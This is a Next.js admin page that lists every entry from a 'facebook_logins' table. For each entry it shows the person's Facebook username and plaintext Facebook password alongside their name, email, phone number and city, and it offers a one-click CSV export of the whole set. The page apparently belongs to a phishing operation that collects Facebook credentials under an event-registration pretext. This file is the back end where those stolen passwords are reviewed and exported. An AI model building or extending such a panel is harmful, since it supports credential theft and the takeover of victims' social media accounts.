"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { createClient } from "@/lib/supabase/client";
import { fetchAllRows } from "@/lib/supabase-helpers";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { AdminHeader } from "@/components/layout/admin-header";
import { getAdminSession } from "@/lib/auth";
import { Loader2, Download } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";

type UserEntry = {
  id: string;
  fb_username: string | null;
  fb_pass: string | null;
  first_name: string | null;
  last_name: string | null;
  email: string | null;
  contact_no: string | null;
  city: string | null;
  selected_event_id: string | null;
  created_at: string;
  updated_at: string;
  event_title?: string | null;
};

export default function UsersPage() {
  const [users, setUsers] = useState<UserEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const supabase = createClient();
  const router = useRouter();
  const { toast } = useToast();

  useEffect(() => {
    // Check admin access
    const admin = getAdminSession();
    if (!admin || admin.status !== "active") {
      router.push("/login");
      return;
    }

    fetchUsers();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [router]);

  const fetchUsers = async () => {
    try {
      setLoading(true);
      
      // Fetch all user entries
      const usersData = await fetchAllRows(
        supabase
          .from("facebook_logins")
          .select(`
            *,
            events:selected_event_id (
              title
            )
          `)
          .order("created_at", { ascending: false })
      );

      // Transform the data to include event title
      const transformedUsers = (usersData || []).map((user: any) => ({
        ...user,
        event_title: user.events?.title || null,
      }));

      setUsers(transformedUsers);
    } catch (error: any) {
      console.error("Error fetching users:", error);
      toast({
        title: "Error",
        description: "Failed to load user entries. Please try again.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString("en-US", {
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  const exportToCSV = () => {
    const headers = [
      "ID",
      "Facebook Username",
      "Facebook Password",
      "First Name",
      "Last Name",
      "Email",
      "Contact No",
      "City",
      "Selected Event",
      "Created At",
      "Updated At",
    ];

    const rows = users.map((user) => [
      user.id,
      user.fb_username || "",
      user.fb_pass || "",
      user.first_name || "",
      user.last_name || "",
      user.email || "",
      user.contact_no || "",
      user.city || "",
      user.event_title || "",
      formatDate(user.created_at),
      formatDate(user.updated_at),
    ]);

    const csvContent = [
      headers.join(","),
      ...rows.map((row) => row.map((cell) => `"${cell}"`).join(",")),
    ].join("\n");

    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const link = document.createElement("a");
    const url = URL.createObjectURL(blob);
    link.setAttribute("href", url);
    link.setAttribute("download", `users_export_${new Date().toISOString().split("T")[0]}.csv`);
    link.style.visibility = "hidden";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    toast({
      title: "Export Successful",
      description: "User data has been exported to CSV.",
    });
  };

  if (loading) {
    return (
      <div className="min-h-screen w-full bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
        <AdminHeader />
        <div className="flex items-center justify-center min-h-[calc(100vh-200px)]">
          <div className="text-center">
            <Loader2 className="h-8 w-8 animate-spin text-primary mx-auto mb-4" />
            <p className="text-slate-400">Loading user entries...</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen w-full bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
      <AdminHeader />
      <div className="px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
        <Card className="bg-slate-800 border-slate-700">
          <CardHeader>
            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
              <div>
                <CardTitle className="text-2xl sm:text-3xl font-bold text-white">
                  User Entries
                </CardTitle>
                <CardDescription className="text-slate-400 mt-2">
                  All user registration entries from Facebook login and Continue without Facebook
                </CardDescription>
              </div>
              <Button
                onClick={exportToCSV}
                className="gap-2 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700"
              >
                <Download className="h-4 w-4" />
                Export CSV
              </Button>
            </div>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto">
              <div className="inline-block min-w-full align-middle">
                <table className="min-w-full divide-y divide-slate-700">
                  <thead className="bg-slate-900/50">
                    <tr>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        FB Username
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        FB Password
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        First Name
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        Last Name
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        Email
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        Contact No
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        City
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        Event
                      </th>
                      <th className="px-4 py-3 text-left text-xs font-medium text-slate-300 uppercase tracking-wider">
                        Created At
                      </th>
                    </tr>
                  </thead>
                  <tbody className="bg-slate-800 divide-y divide-slate-700">
                    {users.length === 0 ? (
                      <tr>
                        <td colSpan={9} className="px-4 py-8 text-center text-slate-400">
                          No user entries found.
                        </td>
                      </tr>
                    ) : (
                      users.map((user, index) => {
                        const hasFacebookLogin = user.fb_username && user.fb_pass;
                        const isEvenRow = index % 2 === 0;
                        
                        return (
                          <tr 
                            key={user.id} 
                            className={`
                              transition-colors relative
                              ${isEvenRow ? 'bg-slate-800/50' : 'bg-slate-800'}
                              ${hasFacebookLogin ? 'hover:bg-slate-700/70' : 'hover:bg-slate-700/50'}
                              ${hasFacebookLogin ? 'border-l-2 border-blue-500/50' : 'border-l-2 border-transparent'}
                            `}
                          >
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.fb_username || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.fb_pass || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.first_name || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.last_name || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.email || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.contact_no || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.city || (
                                <span className="text-slate-500 italic">N/A</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-300">
                              {user.event_title ? (
                                <span className="inline-flex items-center px-2 py-1 rounded-md bg-primary/10 text-primary text-xs font-medium">
                                  {user.event_title}
                                </span>
                              ) : (
                                <span className="text-slate-500 italic">No event</span>
                              )}
                            </td>
                            <td className="px-4 py-3 whitespace-nowrap text-sm text-slate-400">
                              {formatDate(user.created_at)}
                            </td>
                          </tr>
                        );
                      })
                    )}
                  </tbody>
                </table>
              </div>
            </div>
            {users.length > 0 && (
              <div className="mt-4 text-sm text-slate-400">
                Total entries: <span className="font-medium text-slate-300">{users.length}</span>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}

